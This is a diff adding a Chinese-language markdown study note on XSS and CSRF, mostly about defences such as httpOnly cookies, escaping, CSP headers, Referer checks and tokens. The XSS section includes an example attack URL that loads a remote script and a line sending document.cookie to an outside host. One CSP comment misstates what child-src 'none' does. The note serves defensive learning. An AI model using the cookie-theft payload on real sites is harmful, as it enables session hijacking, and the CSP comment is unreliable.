@@ -1,0 +1,47 @@
+### [XSS（跨站脚本攻击）](https://github.com/funnycoderstar/blog/issues/141)
+主要形成原因多数是用户输入没有被转义，而被直接执行
+> 下面是某个网站的前端脚本，他会将URL hash中的值设置到页面中，用以实现某种逻辑如下`$('#box').html(location.hash.replace('#', '')`. 攻击者发现这个漏洞后构造了如下URL:`http://a.com/pathname#<script scr="http://b.com/c.js"></script>`。a.com的某个在线用户访问这个URL时，就会将其中hash值设置为HTML,也就是执行这一段`<script scr="http://b.com/c.js"></script>`，请求到c.js文件，并执行。c.js中的代码可以通过document.cookie获取到用户的cookie,例如`location.herf="http://c.com/?" + document.cookie`，这样黑客就窃取到了用户的cookie.
+
+#### 解决方案
+1. 设置cookie的httpOnly属性
+> 浏览器将禁止页面的Javascript 访问带有 HttpOnly 属性的Cookie。所以，严格来说，HttpOnly 并非阻止 XSS 攻击，而是能阻止 XSS 攻击后的 Cookie 劫持攻击。
+
+2. 编码或转义
+> '、"、<、>、&。例如利用 sanitize-html 对输出内容进行有规则的过滤之后再输出到页面中。
+
+3. CSP 内容安全协议
+> CSP (Content Security Policy) 即内容安全策略，是一种可信白名单机制，可以在服务端配置浏览器哪些外部资源可以加载和执行。我们只需要配置规则，如何拦截是由浏览器自己实现的。我们可以通过这种方式来尽量减少 XSS 攻击。
+
+* 设置 HTTP Header 的 Content-Security-Policy
+```js
+Content-Security-Policy: default-src 'self'; // 只允许加载本站资源
+Content-Security-Policy: img-src https://*  // 只允许加载 HTTPS 协议图片
+Content-Security-Policy: child-src 'none'    // 允许加载任何来源框架
+```
+* 设置 meta 标签的方式
+```js
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
+```
+
+### [CSRF （跨站请求伪造）](https://github.com/funnycoderstar/blog/issues/142)
+在这个攻击过程中，攻击者借助受害者的 Cookie 骗取服务器的信任，但并不能拿到 Cookie，也看不到 Cookie 的内容。而对于服务器返回的结果，由于浏览器同源策略的限制，攻击者也无法进行解析。因此，攻击者无法从返回的结果中得到任何东西，他所能做的就是给服务器发送请求，以执行请求中所描述的命令，在服务器端直接改变数据的值，而非窃取服务器中的数据。
+
+>`res.setHeader('Set-Cookie', ['mycookie=222', 'test=3333; expires=Sat, 21 Jul 2018 00:00:00 GMT;']);`
+上述代码创建了两个 Cookie：mycookie 和 test，前者属于会话期 Cookie，后者则属于持久性 Cookie。当我们去查看 Cookie 相关的属性时，不同的浏览器对会话期 Cookie 的 Expires 属性值会不一样。cookie有一个domin，访问这个路由下的页面将会携带这个cookie。
+
+#### 解决方案
+1. Referer Check
+根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。通过 Referer Check，可以检查请求是否来自合法的"源"。
+
+>比如，如果用户要删除自己的帖子，那么先要登录 www.c.com，然后找到对应的页面，发起删除帖子的请求。此时，Referer 的值是 http://www.c.com；当请求是从 www.a.com 发起时，Referer 的值是 http://www.a.com 了。因此，要防御 CSRF 攻击，只需要对于每一个删帖请求验证其 Referer 值，如果是以 www.c.com 开头的域名，则说明该请求是来自网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是 CSRF 攻击，可以拒绝该请求。
+针对上文的例子，可以在服务端增加如下代码：
+if (req.headers.referer !== 'http://www.c.com:8002/') {
+    res.write('csrf 攻击');
+    return;
+}
+referer check
+Referer Check 不仅能防范 CSRF 攻击，另一个应用场景是 "防止图片盗链"。
+
+2. 
+添加 token 验证
+CSRF 攻击之所以能够成功，是因为攻击者可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 Cookie 中，因此攻击者可以在不知道这些验证信息的情况下直接利用用户自己的 Cookie 来通过安全验证。要抵御 CSRF，关键在于在请求中放入攻击者所不能伪造的信息，并且该信息不存在于 Cookie 之中。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。
